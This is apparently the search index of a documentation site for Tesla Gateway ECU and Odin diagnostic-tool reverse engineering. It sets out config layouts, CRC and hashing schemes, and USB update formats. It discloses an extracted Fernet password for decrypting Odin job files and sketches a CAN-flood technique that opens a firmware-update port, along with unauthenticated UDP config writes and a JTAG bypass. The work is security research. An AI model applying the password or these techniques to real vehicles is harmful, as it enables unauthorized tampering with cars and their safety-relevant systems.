{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Tesla Gateway Security Research","text":"<p>Complete reverse engineering documentation for Tesla Model 3/Y (ICE) and Model S/X (MCU2) infotainment and Gateway ECU systems.</p>"},{"location":"#research-statistics","title":"Research Statistics","text":"Metric Value Status Gateway Configs Extracted 662 entries \u2705 100% CRC verified Odin Scripts Analyzed 2,988 Python files \u2705 Complete Gateway Firmware Size 6 MB (6,225,920 bytes) \u2705 Extracted CAN Messages Documented 6,647 entries \u2705 Cataloged Config Hashing Algorithm SHA256 \u2705 Fully decoded ODJ File Encryption Fernet (PBKDF2-HMAC-SHA256) \u2705 Cracked"},{"location":"#quick-start","title":"Quick Start","text":"<p>5 minutes to understand the research: 1. QUICKSTART.md - Essential concepts 2. docs/1-overview/key-findings.md - Major discoveries</p> <p>Deep dive by topic: - Gateway Security - Complete Gateway reverse engineering - Odin Diagnostic System - Tesla service tool analysis - Attack Research - Security vulnerabilities - Tools - Scripts and utilities</p>"},{"location":"#repository-structure","title":"Repository Structure","text":"<pre><code>tesla/\n\u251c\u2500\u2500 README.md                   # This file\n\u251c\u2500\u2500 QUICKSTART.md               # 5-minute getting started\n\u251c\u2500\u2500 docs/\n\u2502   \u251c\u2500\u2500 1-overview/             # Research overview and key findings\n\u2502   \u2502   \u251c\u2500\u2500 README.md           # What this research covers\n\u2502   \u2502   \u251c\u2500\u2500 key-findings.md     # Major discoveries\n\u2502   \u2502   \u2514\u2500\u2500 evidence-quality.md # Verification standards\n\u2502   \u2502\n\u2502   \u251c\u2500\u2500 2-gateway/              # Gateway ECU analysis\n\u2502   \u2502   \u251c\u2500\u2500 README.md           # Gateway overview\n\u2502   \u2502   \u251c\u2500\u2500 architecture.md     # Hardware and firmware\n\u2502   \u2502   \u251c\u2500\u2500 config-system.md    # 662 configs, CRC-8, two-tier security\n\u2502   \u2502   \u251c\u2500\u2500 udp-protocol.md     # Port 3500 API\n\u2502   \u2502   \u251c\u2500\u2500 security-model.md   # Secure vs insecure configs\n\u2502   \u2502   \u2514\u2500\u2500 firmware-analysis.md # Disassembly findings\n\u2502   \u2502\n\u2502   \u251c\u2500\u2500 3-odin/                 # Odin diagnostic system\n\u2502   \u2502   \u251c\u2500\u2500 README.md           # Odin overview\n\u2502   \u2502   \u251c\u2500\u2500 architecture.md     # How Odin works\n\u2502   \u2502   \u251c\u2500\u2500 config-decoder.md   # SHA256 hashing (COMPLETE)\n\u2502   \u2502   \u251c\u2500\u2500 odj-encryption.md   # Fernet/PBKDF2 decryption\n\u2502   \u2502   \u2514\u2500\u2500 routines-database.md # 2,988 scripts analyzed\n\u2502   \u2502\n\u2502   \u251c\u2500\u2500 4-firmware/             # Platform-specific firmware\n\u2502   \u2502   \u251c\u2500\u2500 ice/                # Model 3/Y (ICE platform)\n\u2502   \u2502   \u2502   \u251c\u2500\u2500 overview.md\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 usb-updates.md\n\u2502   \u2502   \u2514\u2500\u2500 mcu2/               # Model S/X (MCU2 platform)\n\u2502   \u2502       \u2514\u2500\u2500 overview.md\n\u2502   \u2502\n\u2502   \u251c\u2500\u2500 5-attacks/              # Security research\n\u2502   \u2502   \u251c\u2500\u2500 README.md           # Attack surface overview\n\u2502   \u2502   \u251c\u2500\u2500 can-flood.md        # Port 25956 opening exploit\n\u2502   \u2502   \u251c\u2500\u2500 vin-write.md        # VIN modification (JTAG)\n\u2502   \u2502   \u251c\u2500\u2500 service-mode.md     # Authentication analysis\n\u2502   \u2502   \u2514\u2500\u2500 certificate-recovery.md # Orphan vehicle certs\n\u2502   \u2502\n\u2502   \u2514\u2500\u2500 6-tools/                # Tool documentation\n\u2502       \u251c\u2500\u2500 README.md           # Tools overview\n\u2502       \u251c\u2500\u2500 config-decoder.md   # decode_gateway_config.py\n\u2502       \u251c\u2500\u2500 odj-decryptor.md    # decrypt_odj.py\n\u2502       \u251c\u2500\u2500 gateway-tools.md    # gw-diag, UDP tools\n\u2502       \u2514\u2500\u2500 scripts-reference.md # All scripts\n\u2502\n\u251c\u2500\u2500 data/                       # Decoded data files\n\u2502   \u251c\u2500\u2500 configs/                # Gateway configuration databases\n\u2502   \u251c\u2500\u2500 gateway/                # Gateway strings, CAN messages\n\u2502   \u2514\u2500\u2500 odj/                    # Decrypted Odin job files\n\u2502\n\u251c\u2500\u2500 odin/                       # Odin decompiled source\n\u2502   \u2514\u2500\u2500 decompiled/             # Python files from bytecode\n\u2502\n\u2514\u2500\u2500 scripts/                    # Research tools\n    \u251c\u2500\u2500 decode_gateway_config.py\n    \u251c\u2500\u2500 decrypt_odj.py\n    \u251c\u2500\u2500 gateway_crc_validator.py\n    \u251c\u2500\u2500 gateway_database_query.py\n    \u2514\u2500\u2500 signatures.json\n</code></pre>"},{"location":"#platform-terminology","title":"Platform Terminology","text":"Term Meaning Vehicles ICE Infotainment Computer for Entertainment Model 3, Model Y MCU2 Media Control Unit 2 Model S/X (2018+, Raven, Plaid) Gateway Central CAN bus aggregator ECU All Tesla vehicles APE Autopilot ECU (NVIDIA hardware) All with Autopilot Zen/Ryzen AMD Ryzen-based newer MCU 2022+ vehicles Hermes Tesla's mTLS authentication system Backend connectivity"},{"location":"#key-findings-summary","title":"Key Findings Summary","text":""},{"location":"#1-gateway-configuration-system-complete","title":"1. Gateway Configuration System \u2705 COMPLETE","text":"<ul> <li>662 configuration entries extracted from 6MB flash dump</li> <li>CRC-8 algorithm verified (polynomial 0x2F, 100% validation rate)</li> <li>Two-tier security model:</li> <li>Insecure (UDP): Map region, units, preferences - modifiable via UDP:3500</li> <li>Secure (Hermes): VIN, country, supercharger - require Tesla authentication</li> <li>Source: docs/2-gateway/config-system.md</li> </ul>"},{"location":"#2-odin-diagnostic-system-complete","title":"2. Odin Diagnostic System \u2705 COMPLETE","text":"<ul> <li>SHA256-based config hashing fully reverse engineered</li> <li>Algorithm: <code>SHA256(value + key + salt)</code> for values</li> <li>All 62-64 public configs decoded</li> <li>Fernet encryption for ODJ files cracked</li> <li>Password: <code>cmftubxi7wlvmh1wmbzz00vf1ziqezf6</code></li> <li>PBKDF2-HMAC-SHA256, 123456 iterations</li> <li>2,988 diagnostic scripts analyzed for access patterns</li> <li>Source: docs/3-odin/architecture.md</li> </ul>"},{"location":"#3-service-mode-authentication-verified","title":"3. Service Mode Authentication \u2705 VERIFIED","text":"<ul> <li>NOT a local PIN comparison - backend validation required</li> <li>Uses D-Bus + Protobuf signed command infrastructure</li> <li>No hardcoded backdoors found in binary analysis</li> <li>Geofence restrictions exist (<code>isServiceModeAllowedOutsideGeofence</code>)</li> <li>Source: docs/5-attacks/service-mode.md</li> </ul>"},{"location":"#4-usb-offline-updates-complete","title":"4. USB Offline Updates \u2705 COMPLETE","text":"<ul> <li>Package format: SquashFS (LZ4) + NaCl Ed25519 signature + dm-verity hash table</li> <li>File extensions: <code>.ice</code> (Model 3/Y), <code>.mcu2</code> (Model S/X)</li> <li>Signature magic: <code>0xba01ba01</code></li> <li>Cannot bypass on fused vehicles - hardware enforced</li> <li>Source: docs/4-firmware/ice/usb-updates.md</li> </ul>"},{"location":"#5-can-flood-exploit-partially-tested","title":"5. CAN Flood Exploit \u26a0\ufe0f PARTIALLY TESTED","text":"<ul> <li>Mechanism: Flood CAN bus with 0x3C2 + 0x622 \u2192 opens port 25956</li> <li>Impact: Enables firmware handshake redirection</li> <li>Reliability: Varies by firmware version</li> <li>Source: docs/5-attacks/can-flood.md</li> </ul>"},{"location":"#tools-reference","title":"Tools Reference","text":"Tool Purpose Location <code>decode_gateway_config.py</code> Decode SHA256-hashed config names scripts/ <code>decrypt_odj.py</code> Decrypt Odin ODJ job files scripts/ <code>gateway_crc_validator.py</code> Validate Gateway config CRCs scripts/ <code>gateway_database_query.py</code> Query Gateway via UDP:3500 scripts/"},{"location":"#evidence-standards","title":"Evidence Standards","text":"<p>All claims follow strict evidence requirements:</p> Marker Meaning Confidence \u2705 VERIFIED Multiple sources confirm, binary offsets cited 95-100% \u26a0\ufe0f INFERRED Logical deduction from evidence, limited testing 60-80% \u274c UNTESTED Theoretical only, no hardware validation &lt;60%"},{"location":"#network-architecture","title":"Network Architecture","text":"<pre><code>[Vehicle Internal Network: 192.168.90.0/24]\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  MCU (ICE/MCU2) \u2502     \u2502  Gateway ECU    \u2502     \u2502  APE (Autopilot)\u2502\n\u2502  192.168.90.100 \u2502\u2500\u2500\u2500\u2500\u25b6\u2502  192.168.90.102 \u2502\u2500\u2500\u2500\u2500\u25b6\u2502  192.168.90.103 \u2502\n\u2502                 \u2502     \u2502                 \u2502     \u2502                 \u2502\n\u2502 \u2022 QtCarServer   \u2502     \u2502 \u2022 UDP:3500      \u2502     \u2502 \u2022 HTTP:8901     \u2502\n\u2502 \u2022 sx-updater    \u2502     \u2502 \u2022 TFTP:69       \u2502     \u2502   (factory API) \u2502\n\u2502 \u2022 hermes_client \u2502     \u2502 \u2022 CAN bus       \u2502     \u2502 \u2022 Calibration   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502                      \u2502\n         \u2502                      \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 Modem   \u2502           \u2502  CAN Bus  \u2502\n    \u2502 .90.60  \u2502           \u2502  (OBD-II) \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"#security-notice","title":"Security Notice","text":"<p>This research is for educational and security research purposes only.</p> <ul> <li>Do not modify vehicles without authorization</li> <li>Report security findings to Tesla via responsible disclosure</li> <li>Respect intellectual property rights</li> </ul>"},{"location":"#contributing","title":"Contributing","text":"<ol> <li>All claims must cite source (file path, binary offset, or decompiled code)</li> <li>Use firmware-relative paths (e.g., <code>/usr/tesla/UI/</code>, <code>/opt/odin/</code>)</li> <li>Never use host extraction paths (e.g., <code>/root/downloads/</code>)</li> <li>Label platforms clearly: ICE = Model 3/Y, MCU2 = Model S/X (newer)</li> <li>Test all markdown links before committing</li> </ol>"},{"location":"#firmware-paths-reference","title":"Firmware Paths Reference","text":"Purpose Path MCU UI binaries <code>/usr/tesla/UI/bin/</code> Odin tool <code>/opt/odin/</code> Deploy packages <code>/deploy/</code> Hermes client <code>/opt/hermes/</code> Car credentials <code>/var/lib/car_creds/</code> System config <code>/etc/</code> <p>Last Updated: 2026-02-07 Research Status: Gateway configuration COMPLETE, Odin decoding COMPLETE</p>"},{"location":"quickstart/","title":"Tesla Gateway Research - Quick Start Guide","text":"<p>Time to read: 5 minutes</p>"},{"location":"quickstart/#what-is-this","title":"What Is This?","text":"<p>Complete reverse engineering of Tesla's Gateway ECU and Odin diagnostic system. This research documents:</p> <ol> <li>Gateway Configuration System - 662 configs, CRC validation, security model</li> <li>Odin Diagnostic Tool - SHA256 hashing, Fernet encryption, 2,988 scripts</li> <li>USB Update Format - SquashFS + Ed25519 signatures + dm-verity</li> <li>Security Architecture - Two-tier config security, service mode auth</li> </ol>"},{"location":"quickstart/#the-30-second-summary","title":"The 30-Second Summary","text":""},{"location":"quickstart/#gateway-the-brain","title":"Gateway (The Brain)","text":"<ul> <li>What: Central ECU that bridges all CAN buses</li> <li>Processor: NXP MPC5748G (PowerPC e200z7 VLE)</li> <li>Configs: 662 entries stored in flash</li> <li>Access: UDP port 3500 (some configs), Hermes auth (secure configs)</li> </ul>"},{"location":"quickstart/#key-security-finding","title":"Key Security Finding","text":"<p>Two types of configs: <pre><code>INSECURE (UDP:3500)     \u2502  SECURE (Hermes auth)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nMap region              \u2502  VIN\nDisplay units           \u2502  Country code\nUser preferences        \u2502  Supercharger access\nDebug flags             \u2502  Hardware IDs\n</code></pre></p>"},{"location":"quickstart/#essential-concepts","title":"Essential Concepts","text":""},{"location":"quickstart/#1-crc-8-validation","title":"1. CRC-8 Validation","text":"<p>Every Gateway config has a CRC-8 checksum: <pre><code>Polynomial: 0x2F (47 decimal)\nApplied to: [Config ID (2 bytes BE)] + [Data]\n</code></pre></p> <p>Why it matters: Invalid CRC = config rejected</p>"},{"location":"quickstart/#2-config-hashing-odin","title":"2. Config Hashing (Odin)","text":"<p>Tesla obfuscates config names using SHA256: <pre><code>key_hash = SHA256(key + salt)\nvalue_hash = SHA256(value + key + salt)  # Note: value FIRST\n</code></pre></p> <p>We cracked it: All 62-64 public configs decoded</p>"},{"location":"quickstart/#3-odj-encryption","title":"3. ODJ Encryption","text":"<p>Odin job files use Fernet encryption: <pre><code>Password: cmftubxi7wlvmh1wmbzz00vf1ziqezf6\nKDF: PBKDF2-HMAC-SHA256\nIterations: 123456\nSalt: First 16 bytes of file\n</code></pre></p>"},{"location":"quickstart/#4-usb-update-signatures","title":"4. USB Update Signatures","text":"<p>Package format: <pre><code>[SquashFS] + [Padding] + [0xba01ba01 + Ed25519 sig] + [dm-verity hash table]\n</code></pre></p> <p>Cannot forge: Requires Tesla's Ed25519 private key</p>"},{"location":"quickstart/#quick-reference-tables","title":"Quick Reference Tables","text":""},{"location":"quickstart/#critical-config-ids","title":"Critical Config IDs","text":"ID Name Type Access 0x0000 VIN String(17) Secure 0x0006 Country String(2) Secure 0x0014 mapRegion Byte UDP 0x0020 ecuMapVersion Byte UDP 0x0025 Hash 1 SHA-256 Secure 0x0026 Hash 2 SHA-256 Secure"},{"location":"quickstart/#network-ports","title":"Network Ports","text":"Port Protocol Service Access 3500 UDP Gateway config API Internal network 25956 TCP Emergency updater CAN flood trigger 8901 HTTP APE factory API Bearer token 69 TFTP Gateway firmware Service mode"},{"location":"quickstart/#platform-labels","title":"Platform Labels","text":"Label Meaning Use For ICE Infotainment Computer for Entertainment Model 3/Y MCU2 Media Control Unit 2 Model S/X (2018+) Zen AMD Ryzen MCU 2022+ vehicles APE Autopilot ECU All with AP"},{"location":"quickstart/#common-tasks","title":"Common Tasks","text":""},{"location":"quickstart/#read-a-gateway-config","title":"Read a Gateway Config","text":"<pre><code># Using UDP (insecure configs only)\npython3 scripts/gateway_database_query.py read 0x0014\n</code></pre>"},{"location":"quickstart/#decode-config-hashes","title":"Decode Config Hashes","text":"<pre><code>python3 scripts/decode_gateway_config.py \\\n  /opt/odin/data/Model3/config-options.json\n</code></pre>"},{"location":"quickstart/#decrypt-odj-file","title":"Decrypt ODJ File","text":"<pre><code>python3 scripts/decrypt_odj.py input.odj output.json\n</code></pre>"},{"location":"quickstart/#validate-config-crc","title":"Validate Config CRC","text":"<pre><code>from scripts.gateway_crc_validator import calculate_crc8\n\nconfig_id = 0x0000\ndata = b\"7SAYGDEEXPA052466\"  # VIN\ncrc = calculate_crc8(config_id, data)  # Polynomial 0x2F\n</code></pre>"},{"location":"quickstart/#security-model-summary","title":"Security Model Summary","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    GATEWAY ECU                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502\n\u2502  \u2502  UDP Port 3500  \u2502     \u2502  Hermes Authenticated   \u2502   \u2502\n\u2502  \u2502  (INSECURE)     \u2502     \u2502  (SECURE)               \u2502   \u2502\n\u2502  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524   \u2502\n\u2502  \u2502 \u2022 Map region    \u2502     \u2502 \u2022 VIN                   \u2502   \u2502\n\u2502  \u2502 \u2022 Units         \u2502     \u2502 \u2022 Country               \u2502   \u2502\n\u2502  \u2502 \u2022 Preferences   \u2502     \u2502 \u2022 Supercharger          \u2502   \u2502\n\u2502  \u2502 \u2022 Debug flags   \u2502     \u2502 \u2022 Hardware IDs          \u2502   \u2502\n\u2502  \u2502                 \u2502     \u2502 \u2022 Firmware hashes       \u2502   \u2502\n\u2502  \u2502 NO AUTH NEEDED  \u2502     \u2502 gw-diag + auth token    \u2502   \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502\n\u2502  \u2502  PHYSICAL ACCESS (JTAG)                         \u2502   \u2502\n\u2502  \u2502  Bypasses ALL security - direct flash access    \u2502   \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"quickstart/#whats-verified-vs-theoretical","title":"What's Verified vs Theoretical","text":""},{"location":"quickstart/#verified-high-confidence","title":"\u2705 Verified (High Confidence)","text":"<ul> <li>CRC-8 polynomial 0x2F (100% validation on 662 configs)</li> <li>SHA256 config hashing algorithm (decompiled source)</li> <li>Fernet ODJ encryption (password extracted)</li> <li>Two-tier security model (confirmed by source)</li> <li>USB package format (real packages analyzed)</li> </ul>"},{"location":"quickstart/#inferred-medium-confidence","title":"\u26a0\ufe0f Inferred (Medium Confidence)","text":"<ul> <li>Service mode backend validation (binary analysis, not packet capture)</li> <li>Port 25956 bind address (behavior observed, not disassembled)</li> <li>APE bearer token requirement (string evidence)</li> </ul>"},{"location":"quickstart/#untested-low-confidence","title":"\u274c Untested (Low Confidence)","text":"<ul> <li>CAN flood success rate across firmware versions</li> <li>Exact gwmon timeout value</li> <li>Geofence restriction regions</li> </ul>"},{"location":"quickstart/#next-steps","title":"Next Steps","text":"<ol> <li>Deep dive: docs/2-gateway/README.md</li> <li>Attack research: docs/5-attacks/README.md</li> <li>Tool usage: docs/6-tools/README.md</li> <li>Full knowledge base: docs/1-overview/README.md</li> </ol>"},{"location":"quickstart/#files-youll-use-most","title":"Files You'll Use Most","text":"File Purpose <code>scripts/gateway_database_query.py</code> Read/write Gateway configs via UDP <code>scripts/decode_gateway_config.py</code> Decode Odin config hashes <code>scripts/decrypt_odj.py</code> Decrypt Odin job files <code>data/gateway/gateway_configs_parsed.txt</code> All 662 Gateway configs <code>data/gateway/strings.csv</code> 37,702 Gateway firmware strings <p>You're ready to dive in! Start with Gateway Architecture for the full picture.</p>"},{"location":"1-overview/","title":"Research Overview","text":"<p>Complete reverse engineering of Tesla Gateway ECU and Odin diagnostic system.</p>"},{"location":"1-overview/#what-this-research-covers","title":"What This Research Covers","text":"<p>This repository documents security research on Tesla vehicle systems:</p> Area Status Key Findings Gateway Configuration \u2705 Complete 662 configs, CRC-8 verified Odin Diagnostic Tool \u2705 Complete SHA256 hashing cracked ODJ File Encryption \u2705 Complete Fernet password extracted USB Update Format \u2705 Complete Ed25519 + dm-verity Service Authentication \u2705 Analyzed Backend validation required CAN Flood Exploit \u26a0\ufe0f Partial Works, reliability varies"},{"location":"1-overview/#target-vehicles","title":"Target Vehicles","text":"Platform Models MCU Type ICE Model 3, Model Y Intel/AMD Ryzen MCU2 Model S (2018+), Model X (2018+) NVIDIA Tegra"},{"location":"1-overview/#research-artifacts","title":"Research Artifacts","text":""},{"location":"1-overview/#extracted-data","title":"Extracted Data","text":"Data Count Description Gateway Configs 662 entries All vehicle settings Firmware Strings 37,702 Debug messages, function names CAN Messages 6,647 Vehicle bus communications Odin Scripts 2,988 Diagnostic routines Decoded Configs 62-64 Config name mappings"},{"location":"1-overview/#created-tools","title":"Created Tools","text":"Tool Purpose <code>decode_gateway_config.py</code> Decode SHA256 config hashes <code>decrypt_odj.py</code> Decrypt Odin job files <code>gateway_crc_validator.py</code> Validate config CRCs <code>gateway_database_query.py</code> UDP config access"},{"location":"1-overview/#documentation-structure","title":"Documentation Structure","text":"Section Content 1-overview/ This overview, evidence quality 2-gateway/ Gateway ECU analysis 3-odin/ Odin tool research 4-firmware/ Platform-specific firmware 5-attacks/ Security vulnerabilities 6-tools/ Tool documentation"},{"location":"1-overview/#key-documents","title":"Key Documents","text":"Document Description key-findings.md Major discoveries evidence-quality.md Verification standards Gateway Config System 662 configs Odin Config Decoder SHA256 algorithm CAN Flood Attack Port 25956 exploit"},{"location":"1-overview/#quick-navigation","title":"Quick Navigation","text":""},{"location":"1-overview/#by-topic","title":"By Topic","text":"Topic Link How does Gateway work? Gateway Architecture What configs can I modify? Security Model How does Odin hash configs? Config Decoder How do USB updates work? USB Updates What attacks are possible? Attacks Overview"},{"location":"1-overview/#by-task","title":"By Task","text":"Task Link Read a Gateway config UDP Protocol Decode Odin hashes Config Decoder Decrypt ODJ files ODJ Encryption Validate config CRC Config System"},{"location":"1-overview/#research-methodology","title":"Research Methodology","text":""},{"location":"1-overview/#binary-analysis","title":"Binary Analysis","text":"<ul> <li>Static analysis with Ghidra (PowerPC VLE for Gateway)</li> <li>Symbol extraction from ELF binaries</li> <li>String analysis for function identification</li> </ul>"},{"location":"1-overview/#protocol-analysis","title":"Protocol Analysis","text":"<ul> <li>UDP packet capture and reconstruction</li> <li>CAN bus message identification</li> <li>D-Bus interface enumeration</li> </ul>"},{"location":"1-overview/#cryptographic-analysis","title":"Cryptographic Analysis","text":"<ul> <li>SHA256 hash algorithm reversal (Odin configs)</li> <li>Fernet encryption key extraction (ODJ files)</li> <li>CRC-8 polynomial identification (Gateway configs)</li> </ul>"},{"location":"1-overview/#source-code-review","title":"Source Code Review","text":"<ul> <li>Python bytecode decompilation (Odin scripts)</li> <li>JavaScript analysis (handshake servers)</li> <li>Configuration file parsing</li> </ul>"},{"location":"1-overview/#limitations","title":"Limitations","text":""},{"location":"1-overview/#not-covered","title":"Not Covered","text":"Topic Reason Autopilot vision system Different research area Mobile app security Separate attack surface Tesla server infrastructure Out of scope Physical hardware attacks Limited equipment"},{"location":"1-overview/#theoretical-only","title":"Theoretical Only","text":"Topic Status Certificate recovery Documented, not tested Voltage glitching Hardware not available Some CAN messages Not validated on vehicle"},{"location":"1-overview/#contributing","title":"Contributing","text":"<ol> <li>All claims must cite sources</li> <li>Use firmware-relative paths</li> <li>Label platforms clearly (ICE/MCU2)</li> <li>Test links before committing</li> <li>Follow evidence quality standards</li> </ol> <p>Last Updated: 2026-02-07</p>"},{"location":"1-overview/evidence-quality/","title":"Evidence Quality Standards","text":"<p>Verification framework for research claims.</p>"},{"location":"1-overview/evidence-quality/#confidence-levels","title":"Confidence Levels","text":""},{"location":"1-overview/evidence-quality/#verified-95-100-confidence","title":"\u2705 VERIFIED (95-100% confidence)","text":"<p>Requirements: - Multiple independent sources confirm - Binary offsets or code citations - Tested and validated</p> <p>Examples: - CRC-8 polynomial 0x2F (100% validation on 662 configs) - SHA256 config hashing (decompiled source code) - Fernet ODJ encryption (working decryption)</p>"},{"location":"1-overview/evidence-quality/#inferred-60-80-confidence","title":"\u26a0\ufe0f INFERRED (60-80% confidence)","text":"<p>Requirements: - Logical deduction from evidence - String analysis or pattern matching - Limited testing</p> <p>Examples: - Service mode backend validation (symbol analysis, not packet capture) - APE bearer token requirement (string evidence) - Port 25956 behavior (observed, not disassembled)</p>"},{"location":"1-overview/evidence-quality/#untested-60-confidence","title":"\u274c UNTESTED (&lt;60% confidence)","text":"<p>Requirements: - Theoretical only - No hardware validation - Based on documentation or patterns</p> <p>Examples: - CAN flood success rate across firmware versions - Exact gwmon timeout value - Geofence restriction regions</p>"},{"location":"1-overview/evidence-quality/#evidence-types","title":"Evidence Types","text":""},{"location":"1-overview/evidence-quality/#strong-evidence","title":"Strong Evidence","text":"Type Description Example Binary offset Exact location in firmware <code>0x655ec0: setServicePIN()</code> CRC validation 100% match on known data 662 configs all pass Decompiled source Original code recovered Odin config_options.py Working tool Functional implementation decrypt_odj.py Multiple sources Independent confirmation VIN at config 0x0000"},{"location":"1-overview/evidence-quality/#medium-evidence","title":"Medium Evidence","text":"Type Description Example String extraction Function names found <code>GUI_serviceModeAuth</code> Pattern matching Consistent structure Config entry format D-Bus config Permission analysis doip-gateway privilege Single source One reliable source Internal researcher confirmation"},{"location":"1-overview/evidence-quality/#weak-evidence","title":"Weak Evidence","text":"Type Description Example Naming inference Guessed from names Function purpose Documentation Tesla docs (may change) Port numbers Speculation Logical but unconfirmed Timeout values Single observation One test result CAN flood timing"},{"location":"1-overview/evidence-quality/#per-topic-quality-assessment","title":"Per-Topic Quality Assessment","text":""},{"location":"1-overview/evidence-quality/#gateway-research","title":"Gateway Research","text":"Topic Status Evidence Quality 662 configs extracted \u2705 VERIFIED Flash dump + CRC validation CRC-8 polynomial \u2705 VERIFIED 100% match rate Two-tier security \u2705 VERIFIED Odin database + source confirm UDP protocol format \u2705 VERIFIED Working implementation Config metadata table \u26a0\ufe0f INFERRED Found table, flags unverified"},{"location":"1-overview/evidence-quality/#odin-research","title":"Odin Research","text":"Topic Status Evidence Quality SHA256 hashing \u2705 VERIFIED Decompiled source Fernet encryption \u2705 VERIFIED Working decryption Access levels \u2705 VERIFIED JSON database Config ID mapping \u26a0\ufe0f PARTIAL Some IDs unknown"},{"location":"1-overview/evidence-quality/#service-mode","title":"Service Mode","text":"Topic Status Evidence Quality No hardcoded PIN \u2705 VERIFIED Binary search negative Backend validation \u26a0\ufe0f INFERRED Symbol + D-Bus analysis Geofence function \u26a0\ufe0f INFERRED Function name exists Exact validation flow \u274c UNTESTED Needs packet capture"},{"location":"1-overview/evidence-quality/#usb-updates","title":"USB Updates","text":"Topic Status Evidence Quality Package structure \u2705 VERIFIED Real package analysis Ed25519 signature \u2705 VERIFIED Magic byte + size match 